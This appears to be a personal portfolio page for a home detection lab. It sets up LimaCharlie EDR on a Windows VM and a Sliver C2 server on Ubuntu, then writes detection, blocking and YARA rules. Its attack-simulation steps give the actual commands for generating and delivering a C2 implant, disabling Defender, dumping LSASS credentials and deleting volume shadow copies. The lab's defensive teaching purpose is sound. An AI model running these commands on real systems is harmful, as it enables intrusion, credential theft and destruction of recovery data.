@@ -1,0 +1,657 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Home SOC</title>
+    <style>
+        .screenshot {
+            width: 80%;
+            max-width: 800px;
+            height: auto;
+            padding: 20px;
+            margin: 20px auto;
+            display: block;
+            background-color: #f9f9f9;
+            border: 1px solid #ccc;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+        @media (max-width: 768px) {
+            .screenshot {
+                width: 100%;
+                padding: 10px;
+            }
+            header {
+                flex-direction: column;
+                align-items: flex-start;
+            }
+        }
+        header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        header p, header span {
+            margin: 0; 
+            padding: 0;
+        } 
+    </style>
+</head>
+<header>
+    <p>Connor Panso</p> 
+    <span><p>Questions or suggestions, note to <strong>cpanso at outlook dot com</strong></p></span>
+</header>
+<body>
+
+    <h1>Automated Threat Detection and Response Lab</h1>
+
+    <p>This page showcases my home cybersecurity lab environment using VMware Workstation Pro, along with Windows and Ubuntu virtual machines (VMs). It demonstrates how I set up the lab by downloading and installing the necessary software, configuring the VMs, and implementing essential tools for security testing and analysis.</p>
+
+    <p><strong>Summary:</strong> This lab demonstrates how to strengthen cybersecurity defenses using tools like LimaCharlie EDR, YARA, Sliver C2, and VMware Workstation Pro. We configured automated detection and response rules to identify and block malicious activities, including ransomware attempts to delete volume shadow copies. By implementing YARA signatures, we automated malware detection for both files and processes. These enhancements improve our ability to respond swiftly to threats and maintain a secure environment. The lab highlights the importance of continuous testing, refining detection rules, and evolving capabilities to stay ahead of emerging cyber threats.</p>
+
+
+    <h2>Installing VMware Workstation Pro</h2>
+    <ul>
+       <li>Obtain VMware Workstation Pro from Broadcom's website. Note: Access requires creating a Broadcom account.</li>
+      <li>Follow the installation instructions to complete the setup of VMware on your machine.</li>
+    </ul>
+
+    <img src="VMwareWSPRO.png" alt="Windows VM Setup Screenshot" class="screenshot">
+        
+    <h2>Configure a Windows VM</h2>
+    <ul>
+        <li>Download a free Windows virtual machine from Microsoft, ensuring you choose the "VMWare" version.</li>
+        <li>Extract the VM file and import it into VMware using the <code>.ovf</code> file.</li>
+        <li>Adjust the RAM allocation if needed; the default is set to 8GB, but it can operate with as little as 4GB.</li>
+    </ul>
+        
+    <img src="WindowsVM.png" alt="Windows VM Setup Screenshot" class="screenshot">
+    <img src="ovfFile.png" alt="Windows VM Setup Screenshot" class="screenshot">
+    <img src="importingWVM.png" alt="Windows VM Setup Screenshot" class="screenshot">
+
+    <h2>Install Ubuntu Server VM</h2>
+    <ul>
+        <li>Download the ISO file for Ubuntu Server 22.04.1.</li>
+        <li>Create a new virtual machine in VMware with specifications of 2 CPU cores, 2GB of RAM, and a 14GB disk size.</li>
+        <li>Select the Ubuntu Server ISO as the installation source.</li>
+        <li>During installation, set a static IP address to maintain stable network connectivity.</li>
+    </ul>
+
+    <img src="ubtiso.png" alt="Windows VM Setup Screenshot" class="screenshot">
+    
+    <h2>Set Up Network Configuration in Ubuntu VM</h2>
+    <ul>
+        <li>Determine the gateway IP address for your VMware Workstation's NAT network.</li>
+        <li>Manually set the Ubuntu VM to use this gateway IP, configuring a static IP address for consistent network access.</li>
+    </ul>
+
+    <img src="ubtstatic.png" alt="Windows VM Setup Screenshot" class="screenshot">
+    
+    <h2>Prepare the Windows VM for Security Testing</h2>
+    <ul>
+        <li>Disable Microsoft Defender to avoid interference with testing activities. Use the Group Policy Editor and Registry modifications to disable it permanently.</li>
+    </ul>
+
+    <img src="avdisable.png" alt="Defender Configuration Screenshot" class="screenshot">
+
+    <p>This setup will be the basis for performing various security tests and experiments.</p>
+
+    <h2>Deploying LimaCharlie EDR on Windows VM</h2>
+    <p>LimaCharlie is a robust SecOps Cloud Platform that provides cross-platform Endpoint Detection and Response (EDR), log management, data ingestion, and threat detection capabilities. This section outlines how to install LimaCharlie on your Windows VM, which is available for free for personal use on up to two systems.</p>
+    
+    <h3>Register for a LimaCharlie Account</h3>
+    <ul>
+        <li>Create a free LimaCharlie account by signing up on their website.</li>
+    </ul>
+    
+    <h3>Configure Your Organization in LimaCharlie</h3>
+    <ul>
+        <li>Once logged in, proceed to create a new organization:</li>
+        <ul>
+            <li><strong>Name:</strong> Provide a unique name for your organization.</li>
+            <li><strong>Data Residency:</strong> Choose the location closest to you.</li>
+            <li><strong>Demo Configuration Enabled:</strong> Set this option to "Disabled".</li>
+            <li><strong>Template:</strong> Choose "Extended Detection & Response Standard".</li>
+        </ul>
+        <li>After creating the organization, click on “Add Sensor”.</li>
+        <li>Select “Windows” and provide a description, such as "Windows VMLab".</li>
+        <li>Click “Create” and make a note of the Installation Key provided.</li>
+    </ul>
+    
+    <img src="windowssensor.png" alt="Windows VM Setup Screenshot" class="screenshot">
+
+    <h3>Installing the LimaCharlie Sensor on Your Windows VM</h3>
+    <ul>
+        <li>Launch an Administrative PowerShell console on your Windows VM.</li>
+        <li>Execute the following commands to download the LimaCharlie sensor:</li>
+        <pre><code>
+    cd C:\Users\User\Downloads
+    Invoke-WebRequest -Uri https://downloads.limacharlie.io/sensor/windows/64 -Outfile C:\Users\User\Downloads\lc_sensor.exe
+    cmd.exe
+        </code></pre>
+        <li>Use the installation command provided by LimaCharlie, which includes your unique Installation Key.</li>
+        <li>If you encounter installation problems, consider using the x86-64 MSI option available in the LimaCharlie installer interface.</li>
+        <li>Confirm that the sensor is successfully communicating with LimaCharlie by checking the web interface.</li>
+    </ul>
+
+    <img src="LCpsscript.png" alt="LimaCharlie Installation Screenshot" class="screenshot">
+
+    <h3>Set Up LimaCharlie to Collect Sysmon Logs</h3>
+    <ul>
+        <li>Go to the "Artifact Collection" section within the LimaCharlie dashboard.</li>
+        <li>Select “Add Rule” under "Artifact Collection Rules".</li>
+        <ul>
+            <li><strong>Name:</strong> windows-sysmon-logs</li>
+            <li><strong>Platforms:</strong> Windows</li>
+            <li><strong>Path Pattern:</strong> wel://Microsoft-Windows-Sysmon/Operational:*</li>
+            <li><strong>Retention Period:</strong> 10</li>
+        </ul>
+        <li>Click “Save Rule” to start gathering Sysmon logs.</li>
+    </ul>
+
+    <img src="sysmonloglc.png" alt="LimaCharlie Installation Screenshot" class="screenshot">
+
+    <p>With this configuration, LimaCharlie will now collect Sysmon logs alongside its EDR telemetry, providing comprehensive event data for security monitoring and analysis.</p>
+
+    <h2>Configure the Attack System on the Linux VM</h2>
+    <p>We will set up an attack system using the Linux VM. This will involve accessing the VM via SSH and installing the Sliver Command & Control (C2) framework to carry out cybersecurity operations.</p>
+
+    <h3>Connecting to the Linux VM via SSH</h3>
+    <ul>
+        <li>Use an SSH client to connect to your Ubuntu VM using the static IP address set up earlier.</li>
+        <li>On Windows, open a terminal and execute:</li>
+        <pre><code>ssh user@[Linux_VM_IP]</code></pre>
+        <li>Once connected, log in with your Linux VM user credentials.</li>
+    </ul>
+
+    <h3>Installing the Sliver C2 Server</h3>
+    <ul>
+        <li>After connecting via SSH, switch to the root user to streamline the installation process:</li>
+        <pre><code>sudo su</code></pre>
+        <li>Download and set up the Sliver server binary using the following commands:</li>
+        <pre><code>
+    wget https://github.com/BishopFox/sliver/releases/download/v1.5.34/sliver-server_linux -O /usr/local/bin/sliver-server
+
+    chmod +x /usr/local/bin/sliver-server
+
+    apt install -y mingw-w64
+        </code></pre>
+        <li>Create a directory for future Sliver-related tasks:</li>
+        <pre><code>mkdir -p /opt/sliver</code></pre>
+    </ul>
+
+    <h2>Create and Deploy the C2 Payload</h2>
+    <p>We will now generate a Command & Control (C2) payload using Sliver and deploy it to the Windows VM for testing purposes. This involves creating the payload on the Linux VM, transferring it to the Windows VM, and initiating a command and control session.</p>
+    
+    <h3>Create the C2 Payload</h3>
+    <ul>
+        <li>SSH into the Linux VM as previously instructed.</li>
+        <li>Switch to root user and navigate to the Sliver installation directory:</li>
+        <pre><code>
+    sudo su
+    cd /opt/sliver
+        </code></pre>
+        <li>Start the Sliver server:</li>
+        <pre><code>sliver-server</code></pre>
+
+        <img src="genc2.png" alt="LimaCharlie Installation Screenshot" class="screenshot">
+
+        <li>Generate a C2 payload using the Linux VM’s static IP address:</li>
+        <pre><code>generate --http [Linux_VM_IP] --save /opt/sliver</code></pre>
+        <li>Make a note of the randomized name given to the output file.</li>
+        <li>Verify the implant configuration:</li>
+        <pre><code>implants</code></pre>
+        <li>Exit the Sliver server:</li>
+        <pre><code>exit</code></pre>
+    </ul>
+    
+    <h3>Transfer the C2 Payload to the Windows VM</h3>
+    <ul>
+        <li>Use a simple Python web server to facilitate the file transfer:</li>
+        <pre><code>
+    cd /opt/sliver
+    python3 -m http.server 80
+        </code></pre>
+
+        <img src="pyc2.png" alt="LimaCharlie Installation Screenshot" class="screenshot">
+
+        <li>Switch to the Windows VM and open an Administrative PowerShell console.</li>
+        <li>Download the C2 payload from the Linux VM to the Windows VM:</li>
+        <pre><code>
+    IWR -Uri http://[Linux_VM_IP]/[payload_name].exe -Outfile C:\Users\User\Downloads\[payload_name].exe
+        </code></pre>
+    </ul>
+    
+    <h3>Initiate the Command and Control Session</h3>
+    <ul>
+        <li>Go back to the Linux VM SSH session.</li>
+        <li>Stop the Python web server by pressing <code>Ctrl + C</code>.</li>
+        <li>Restart the Sliver server:</li>
+        <pre><code>sliver-server</code></pre>
+        <li>Activate the Sliver HTTP listener to catch the callback:</li>
+        <pre><code>http</code></pre>
+        <li>Return to the Windows VM and execute the C2 payload using the Administrative PowerShell console:</li>
+        <pre><code>C:\Users\User\Downloads\[payload_name].exe</code></pre>
+
+        <img src="exeprogc2.png" alt="LimaCharlie Installation Screenshot" class="screenshot">
+
+        <li>Confirm that the session has successfully connected to the Sliver server:</li>
+        <pre><code>sessions</code></pre>
+        <li>Use the session ID to interact with the C2 session:</li>
+        <pre><code>use [session_id]</code></pre>
+    </ul>
+    
+    <h3>Basic Commands for C2 Interaction</h3>
+    <ul>
+        <li>Retrieve basic session information:</li>
+        <pre><code>info</code></pre>
+        <li>Check the user context and privileges of the implant:</li>
+        <pre><code>
+    whoami
+    getprivs
+        </code></pre>
+
+        <img src="infoc2.png" alt="LimaCharlie Installation Screenshot" class="screenshot">
+
+        <li>Determine the working directory of the implant:</li>
+        <pre><code>pwd</code></pre>
+        <li>Review network connections on the remote system:</li>
+        <pre><code>netstat</code></pre>
+        <li>Display running processes on the remote system:</li>
+        <pre><code>ps -T</code></pre>
+    </ul>
+    
+    <p>These procedures allow you to generate and deploy a C2 payload, establish a control session, and interact with the compromised Windows VM. By examining network connections and active processes, you gain valuable insights into the security status of the target system, including identifying any defensive measures in place.</p>
+    
+    <h2>Monitor EDR Telemetry in LimaCharlie</h2>
+    <p>With the C2 payload running on the Windows VM, we will use the LimaCharlie web UI to monitor telemetry data and gain insights into the activities occurring on the endpoint. This involves exploring various aspects of LimaCharlie, such as process monitoring, network activity, and file system interactions.</p>
+
+    <img src="processeslc.png" alt="LimaCharlie Installation Screenshot" class="screenshot">
+
+    <h3>Examining Process Information</h3>
+    <ul>
+        <li>Log in to the LimaCharlie web UI.</li>
+        <li>Click on “Sensors” in the left-side menu to view a list of your active sensors.</li>
+        <li>Select your active Windows sensor from the list.</li>
+        <li>Click on “Processes” in the new left-side menu to see the process tree.</li>
+        <li>Spend time exploring the process tree, hovering over icons for more details about each process.</li>
+        <li>Identify unsigned processes, as these might be suspicious. Verify if your C2 implant is unsigned and observe its network activity.</li>
+    </ul>
+    
+    <h3>Investigating Network Activity</h3>
+    <ul>
+        <li>Click on the “Network” tab in the left-side menu to view network connections.</li>
+        <li>Use <code>Ctrl+F</code> to search for your implant name or C2 IP address within the network list.</li>
+        <li>Pay attention to any unusual or unexpected network connections, particularly those associated with your implant.</li>
+    </ul>
+    
+    <img src="filesyslc.png" alt="LimaCharlie Installation Screenshot" class="screenshot">
+
+    <h3>Inspecting the File System</h3>
+    <ul>
+        <li>Go to the “File System” tab in the left-side menu.</li>
+        <li>Navigate to the directory where the implant is located (e.g., <code>C:\Users\User\Downloads</code>).</li>
+        <li>Check the hash of the suspicious executable using the “Scan with VirusTotal” option.</li>
+        <li>Keep in mind that if VirusTotal shows “Item not found,” it does not necessarily mean the file is safe. It may indicate that the file is new or custom-made.</li>
+    </ul>
+
+    <img src="timelinelc.png" alt="EDR Telemetry Screenshot" class="screenshot">
+
+    <h3>Utilizing the Timeline View</h3>
+    <ul>
+        <li>Navigate to the “Timeline” tab in the left-side menu of the selected sensor.</li>
+        <li>The Timeline provides a near real-time display of EDR telemetry and event logs.</li>
+        <li>Use filters to locate known Indicators of Compromise (IOCs) like the implant name or C2 IP address.</li>
+        <li>Scroll through the timeline to identify key events, such as when the implant was created, launched, and its subsequent network activities.</li>
+        <li>Look for events such as “SENSITIVE_PROCESS_ACCESS,” which may have occurred when privileges were enumerated earlier. These events will be vital for creating detection rules later on.</li>
+    </ul>
+
+    <p>By leveraging LimaCharlie’s detailed views and analysis tools, you can monitor suspicious activities and understand how attackers interact with compromised systems. Knowing the difference between normal and abnormal behaviors is crucial for effectively detecting and responding to security incidents.</p>
+
+    <hr>
+
+    <h2>Simulating Adversarial Behavior</h2>
+    <p>We will simulate adversarial activities using the Sliver C2 session to perform actions commonly associated with cyber threats. This will help us learn how to detect and respond to such activities using our security tools.</p>
+
+    <h3>Reconnect to the Sliver C2 Session</h3>
+    <ul>
+        <li>Start an SSH session on the Linux VM and re-establish the C2 session on the Windows VM using Sliver.</li>
+        <li>If needed, refer back to Part 2 to reconnect to the C2 session.</li>
+    </ul>
+
+    <h3>Checking Privileges</h3>
+    <ul>
+        <li>Within the Sliver session, verify the current privileges to ensure the ability to perform privileged actions:</li>
+        <pre><code>getprivs</code></pre>
+        <li>Look for <code>SeDebugPrivilege</code>. If present, proceed. If not, restart your C2 implant with administrative rights.</li>
+    </ul>
+
+    <img src="procdumpls.png" alt="EDR Telemetry Screenshot" class="screenshot">
+
+    <h3>Dumping LSASS Process for Credential Theft</h3>
+    <ul>
+        <li>Adversaries frequently dump the LSASS process to steal credentials. Execute the following command to dump <code>lsass.exe</code>:</li>
+        <pre><code>procdump -n lsass.exe -s lsass.dmp</code></pre>
+        <li>This command will dump the process memory locally on the Sliver C2 server. Even if it fails, it may still generate valuable telemetry for detection.</li>
+    </ul>
+
+    <h3>Detecting Adversarial Activity</h3>
+    <p>Switch to the LimaCharlie web UI to detect the LSASS dump attempt:</p>
+
+    <ul>
+        <li>Go to the “Timeline” of your Windows VM sensor in LimaCharlie.</li>
+        <li>Use the “Event Type Filters” to find <code>SENSITIVE_PROCESS_ACCESS</code> events.</li>
+        <li>Examine events associated with LSASS access, which are commonly linked to credential dumping techniques.</li>
+    </ul>
+
+    <img src="adverdetect.png" alt="EDR Telemetry Screenshot" class="screenshot">
+
+    <img src="detectrule.png" alt="EDR Telemetry Screenshot" class="screenshot">
+
+    <h3>Creating a Detection and Response (D&R) Rule</h3>
+    <ul>
+        <li>Click the button to start building a detection rule based on the LSASS access event.</li>
+        <li>In the “Detect” section, replace the existing content with the following:</li>
+        <pre><code>
+    event: SENSITIVE_PROCESS_ACCESS
+    op: ends with
+    path: event/*/TARGET/FILE_PATH
+    value: lsass.exe
+        </code></pre>
+        <li>This rule will detect any access to <code>lsass.exe</code> flagged by <code>SENSITIVE_PROCESS_ACCESS</code> events.</li>
+    </ul>
+
+    <img src="rulecreation.png" alt="EDR Telemetry Screenshot" class="screenshot">
+
+    <h3>Configuring the Response Action</h3>
+    <ul>
+        <li>In the “Respond” section, replace the existing content with the following:</li>
+        <pre><code>
+    - action: report
+    name: LSASS access
+        </code></pre>
+        <li>This basic action generates a detection report whenever the rule is triggered.</li>
+    </ul>
+
+    <h3>Testing and Saving the Rule</h3>
+    <ul>
+        <li>Test the rule by selecting “Target Event” below the D&R rule.</li>
+        <li>Scroll to the bottom of the raw event and click “Test Event” to validate the detection logic.</li>
+        <li>A successful test will show a “Match” confirmation.</li>
+        <li>Scroll back up, click “Save Rule,” name it “LSASS Accessed,” and ensure it is enabled.</li>
+    </ul>
+
+    <img src="ruletest.png" alt="EDR Telemetry Screenshot" class="screenshot">
+
+    <p>Simulating these adversarial actions and configuring detection rules provides practical experience in identifying and responding to malicious activities. This exercise demonstrates the use of EDR telemetry and detection logic to monitor sensitive processes like LSASS for unauthorized access attempts.</p>
+
+    <h2>Testing Detections with Repeated Adversarial Activity</h2>
+    <p>We will repeat the adversarial action to validate the detection rules. By rerunning the LSASS dump, we can verify that our LimaCharlie detection setup correctly identifies this malicious activity.</p>
+
+    <h3>Re-running the Procdump Command</h3>
+    <ul>
+        <li>Return to the Sliver server console and reconnect to your C2 session on the Windows VM.</li>
+        <li>Execute the same procdump command to attempt dumping the <code>lsass.exe</code> process again:</li>
+        <pre><code>procdump -n lsass.exe -s lsass.dmp</code></pre>
+    </ul>
+
+    <h3>Reviewing Detections in LimaCharlie</h3>
+    <ul>
+        <li>Switch back to the LimaCharlie web UI.</li>
+        <li>Click on the “Detections” tab in the main left-side menu.</li>
+        <li>If you are in the sensor's context, click “Back to Sensors” at the top of the menu to reveal the “Detections” option.</li>
+    </ul>
+
+    <img src="detectionruleworking.png" alt="EDR Telemetry Screenshot" class="screenshot">
+
+    <h3>Analyzing Detection Results</h3>
+    <ul>
+        <li>Expand a detection entry to view the associated raw event details.</li>
+        <li>Click “View Event Timeline” within the detection entry to jump directly to the timeline where the event was logged.</li>
+    </ul>
+
+    <p>By repeating the malicious activity and reviewing detection results, you can confirm that your custom detection rules are effectively identifying suspicious actions. This hands-on practice reinforces your understanding of using EDR tools for monitoring and protecting against real-world threats.</p>
+
+    <p>In a production environment, it’s crucial to fine-tune detection rules to minimize noise and focus on genuine threats. Regular testing and adjustments will enhance the accuracy and effectiveness of your security monitoring strategy.</p>
+
+    <h2>Preventing Malicious Activities</h2>
+
+    <p>Volume Shadow Copies allow for easy restoration of files or entire file systems, making them a vital component in recovering from ransomware attacks. It’s a predictable behavior that one of the first actions of ransomware is to delete these copies to prevent recovery.</p>
+
+    <p>The command commonly used to delete volume shadow copies is:</p>
+    <pre><code>vssadmin delete shadows /all</code></pre>
+    <p>This command is rarely executed in healthy environments (though some backup or software management tools might occasionally use it), making it a suitable candidate for a blocking rule with low false positives and high threat relevance.</p>
+
+    <h3>Setting Up Detection</h3>
+    <p>Start your Linux and Windows VMs and return to your Sliver C2 shell.</p>
+
+    <ul>
+        <li>SSH into the Linux VM and open a C2 session on the target Windows VM.</li>
+        <li>Refer back to Part 2 if you need guidance on re-establishing the session.</li>
+        <li>If you face issues with the HTTP listener, consider rebooting the Ubuntu VM.</li>
+        <li>In the Sliver C2 shell on the victim system, execute the command we want to detect and block:</li>
+        <pre><code>shell</code></pre>
+
+        <img src="shellc2.png" alt="EDR Telemetry Screenshot" class="screenshot">
+
+        <li>When prompted with “This action is bad OPSEC, are you an adult?”, type Y and press Enter.</li>
+        <li>In the new system shell, run:</li>
+        <pre><code>vssadmin delete shadows /all</code></pre>
+        <li>The output doesn’t matter; running the command is enough to generate the necessary telemetry.</li>
+        <li>Run <code>whoami</code> to verify that the system shell is still active:</li>
+        <pre><code>whoami</code></pre>
+    </ul>
+
+    <h3>Reviewing Detection in LimaCharlie</h3>
+    <ul>
+        <li>Navigate to LimaCharlie’s “Detections” tab to see if default Sigma rules detected the command.</li>
+        <li>Click on the detection to view the metadata and references provided by the Sigma rules, which help understand the reasoning behind the detection.</li>
+        <li>Check the event in the Timeline to see the raw event that triggered the detection.</li>
+    </ul>
+
+    <img src="shawdowdetecrule.png" alt="EDR Telemetry Screenshot" class="screenshot">
+
+    <h3>Creating a Detection & Response (D&R) Rule</h3>
+    <p>Based on the observed detection, create a D&R rule:</p>
+
+    <img src="detecrulec2.png" alt="EDR Telemetry Screenshot" class="screenshot">
+
+    <ul>
+        <li>Start crafting a D&R rule using the offending event as a template.</li>
+        <li>Add the following response actions in the “Respond” section:</li>
+        <pre><code>
+    - action: report
+    name: vss_deletion_kill_it
+    - action: task
+    command:
+        - deny_tree
+        - &lt;&lt;routing/parent&gt;&gt;
+        </code></pre>
+        <li>The <code>action: report</code> generates a detection report. The <code>action: task</code> uses <code>deny_tree</code> to terminate the parent process responsible for running <code>vssadmin delete shadows /all</code>.</li>
+        <li>Save your rule with the name: <code>vss_deletion_kill_it</code></li>
+    </ul>
+
+    <h3>Testing the Blocking Rule</h3>
+    <p>Return to your Sliver C2 session and rerun the command to delete volume shadows:</p>
+    <pre><code>vssadmin delete shadows /all</code></pre>
+
+    <img src="rerunvss.png" alt="EDR Telemetry Screenshot" class="screenshot">
+
+    <ul>
+        <li>The command itself may succeed, but the act of running it should trigger your D&R rule.</li>
+        <li>To confirm the D&R rule worked, try running <code>whoami</code> again in the system shell:</li>
+        <pre><code>whoami</code></pre>
+        <li>If the rule successfully terminated the parent process, the system shell will hang or provide no output, indicating the process was killed.</li>
+    </ul>
+
+    <p>If you see output like “Shell Exited,” it indicates the process was effectively terminated. In a real-world ransomware scenario, this could mean stopping the ransomware payload or lateral movement tool responsible for the attack.</p>
+
+    <h2>Automating Malware Detection with YARA</h2>
+
+    <p>This focuses on leveraging the advanced capabilities of our EDR sensor to automatically scan files and processes for malware using YARA signatures.</p>
+
+    <h3>Setting Up Automated YARA Scans in LimaCharlie</h3>
+    <p>We’ll configure our LimaCharlie instance to automatically detect certain file and process activities and trigger YARA scans.</p>
+
+    <h3>Adding a YARA Signature for Sliver C2 Payload</h3>
+    <ul>
+        <li>Since we’re working with the Sliver C2 payload, we can use a YARA signature tailored to detect Sliver.</li>
+        <li>The UK National Cyber Security Centre has published helpful YARA signatures for Sliver. These have been extracted from the original PDF format for convenience.</li>
+        <li>Navigate to “Automation” > “YARA Rules” in LimaCharlie.</li>
+        <li>If you see “YARA Service” instead of “YARA Rules,” switch to the new YARA Extension.</li>
+        <li>If a permission error occurs, fix it by going to “Access Management” > “Users & Roles,” selecting your username, and enabling all permissions. Then update and close.</li>
+        <li>Go back to “Automation” > “YARA Rules” and click “Add YARA Rule.”</li>
+        <li>Name the rule <code>sliver</code> and paste the relevant YARA signature into the rule block.</li>
+        <li>Save the rule.</li>
+    </ul>
+
+    <h3>Setting Up Detection & Response (D&R) Rules for YARA Detections</h3>
+    <ul>
+        <li>Create a D&R rule to generate alerts when YARA detects a threat not related to a process object:</li>
+        <pre><code>
+    event: YARA_DETECTION
+    op: and
+    rules:
+    - not: true
+        op: exists
+        path: event/PROCESS/*
+    - op: exists
+        path: event/RULE_NAME
+        </code></pre>
+        <li>In the Respond block:</li>
+        <pre><code>
+    - action: report
+    name: YARA Detection {{ .event.RULE_NAME }}
+    - action: add tag
+    tag: yara_detection
+    ttl: 80000
+        </code></pre>
+        <li>Save this rule as <code>YARA Detection</code>.</li>
+        <li>Create another D&R rule for YARA detections specifically involving a process:</li>
+        <pre><code>
+    event: YARA_DETECTION
+    op: and
+    rules:
+    - op: exists
+        path: event/RULE_NAME
+    - op: exists
+        path: event/PROCESS/*
+        </code></pre>
+        <li>In the Respond block:</li>
+        <pre><code>
+    - action: report
+    name: YARA Detection in Memory {{ .event.RULE_NAME }}
+    - action: add tag
+    tag: yara_detection_memory
+    ttl: 80000
+        </code></pre>
+        <li>Save this rule as <code>YARA Detection in Memory</code>.</li>
+    </ul>
+
+    <img src="yaradr.png" alt="EDR Telemetry Screenshot" class="screenshot">
+
+    <h3>Testing the YARA Signature</h3>
+    <p>We know there’s a Sliver implant in the Downloads folder on our Windows VM. Let’s manually initiate a YARA scan to verify the setup:</p>
+
+    <ul>
+        <li>Go to the “Sensors List” in LimaCharlie and select your Windows VM sensor.</li>
+        <li>Access the EDR Sensor Console to run commands.</li>
+        <li>Execute the following command, replacing <code>[payload_name]</code> with your Sliver executable name:</li>
+        <pre><code>yara_scan hive://yara/sliver -f C:\Users\User\Downloads\[payload_name].exe</code></pre>
+        <li>Ensure a positive YARA detection is recorded on the “Detections” screen.</li>
+    </ul>
+
+    <img src="downloadmoveddetec.png" alt="EDR Telemetry Screenshot" class="screenshot">
+
+    <h3>Automating YARA Scans on New Executables</h3>
+    <ul>
+        <li>Create a D&R rule that scans new .exe files appearing in any user’s Downloads directory:</li>
+        <pre><code>
+    event: NEW_DOCUMENT
+    op: and
+    rules:
+    - op: starts with
+        path: event/FILE_PATH
+        value: C:\Users\
+    - op: contains
+        path: event/FILE_PATH
+        value: \Downloads\
+    - op: ends with
+        path: event/FILE_PATH
+        value: .exe
+        </code></pre>
+        <li>In the Respond block:</li>
+        <pre><code>
+    - action: report
+    name: EXE dropped in Downloads directory
+    - action: task
+    command: >-
+        yara_scan hive://yara/sliver -f "{{ .event.FILE_PATH }}"
+    investigation: Yara Scan Exe
+    suppression:
+        is_global: false
+        keys:
+        - '{{ .event.FILE_PATH }}'
+        - Yara Scan Exe
+        max_count: 1
+        period: 1m
+        </code></pre>
+        <li>Save this rule as <code>YARA Scan Downloaded EXE</code>.</li>
+    </ul>
+
+    <h3>Automating YARA Scans on Processes Launched from Downloads</h3>
+    <ul>
+        <li>Create a D&R rule for processes started from a user’s Downloads directory:</li>
+        <pre><code>
+    event: NEW_PROCESS
+    op: and
+    rules:
+    - op: starts with
+        path: event/FILE_PATH
+        value: C:\Users\
+    - op: contains
+        path: event/FILE_PATH
+        value: \Downloads\
+        </code></pre>
+        <li>In the Respond block:</li>
+        <pre><code>
+    - action: report
+    name: Execution from Downloads directory
+    - action: task
+    command: yara_scan hive://yara/sliver-process --pid "{{ .event.PROCESS_ID }}"
+    investigation: Yara Scan Process
+    suppression:
+        is_global: false
+        keys:
+        - '{{ .event.PROCESS_ID }}'
+        - Yara Scan Process
+        max_count: 1
+        period: 1m
+        </code></pre>
+        <li>Save this rule as <code>YARA Scan Process Launched from Downloads</code>.</li>
+    </ul>
+
+    <h3>Triggering the New Rules</h3>
+
+    <img src="exemoved.png" alt="EDR Telemetry Screenshot" class="screenshot">
+
+    <p>To test our new rules, simulate a new EXE appearing in the Downloads directory by moving the Sliver payload out and back into the Downloads folder:</p>
+
+    <ul>
+        <li>Use PowerShell to move the payload to Documents:</li>
+        <pre><code>Move-Item -Path C:\Users\User\Downloads\[payload_name].exe -Destination C:\Users\User\Documents\[payload_name].exe</code></pre>
+        <li>Move it back to Downloads:</li>
+        <pre><code>Move-Item -Path C:\Users\User\Documents\[payload_name].exe -Destination C:\Users\User\Downloads\[payload_name].exe</code></pre>
+        <li>Check the Detections tab for new alerts indicating a YARA scan was triggered.</li>
+    </ul>
+
+    <h2>Conclusion</h2>
+    <p>Throughout this page, we've implemented advanced detection and response strategies to enhance our cybersecurity posture. By deploying LimaCharlie EDR and configuring automated YARA scans, we've gained the ability to identify and react to potential threats swiftly. We've also explored how to block malicious activities effectively, such as the deletion of volume shadow copies, which are common in ransomware attacks. These steps are crucial in building a robust defense against various cyber threats.</p>
+
+    <p>Moving forward, the next steps will involve refining these detection rules to reduce false positives and increase efficiency. We'll also explore integrating additional threat intelligence sources and expanding our automated scanning capabilities to cover more types of malicious behavior. By continuously enhancing our detection and response mechanisms, we can better protect our environment from both known and emerging threats, keeping our systems secure and resilient.</p>
+
+
+    <hr>
+    <a href="../../index.html">Connor Panso</a>
+</body>
+</html>
